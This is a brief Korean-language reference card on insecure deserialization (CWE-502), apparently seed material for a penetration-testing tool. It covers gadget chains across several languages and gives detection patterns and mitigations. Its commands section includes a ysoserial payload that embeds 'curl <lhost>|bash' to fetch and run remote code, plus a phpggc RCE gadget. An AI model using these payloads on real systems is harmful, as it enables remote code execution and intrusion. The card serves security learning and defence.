# 학습 시드(심화): deserialization

> 종합 레퍼런스(확립된 보안 지식 · 권위 출처 검증가능). 라이브 최신화: `assassin --learn deserialization`. P1: 머신별 라이트업 미참조.

## 개요
안전하지 않은 역직렬화: 신뢰불가 직렬화 데이터 복원 시 가젯체인으로 RCE. CWE-502.

## 핵심 기법 · 열거
- Java: ysoserial 가젯(CommonsCollections 등)
- PHP: __wakeup/__destruct 매직메서드 체인(POP)
- Python pickle·.NET ViewState·Ruby Marshal
- 탐지: 매직바이트(rO0=Java, O:PHP)

## 표준 도구 · 명령
```
java -jar ysoserial.jar CommonsCollections5 'curl <lhost>|bash' | base64
phpggc Monolog/RCE1 system id          # PHP 가젯
# 쿠키/파라미터의 base64 역직렬화 지점 교체
```

## 블루팀 탐지
rO0AB/O:숫자 패턴 입력·역직렬화 후 비정상 자식프로세스·가젯 클래스 로드.

## 완화
신뢰불가 역직렬화 금지·서명/무결성·허용목록 클래스·JSON 등 데이터 포맷.

- 출처(검증): https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html
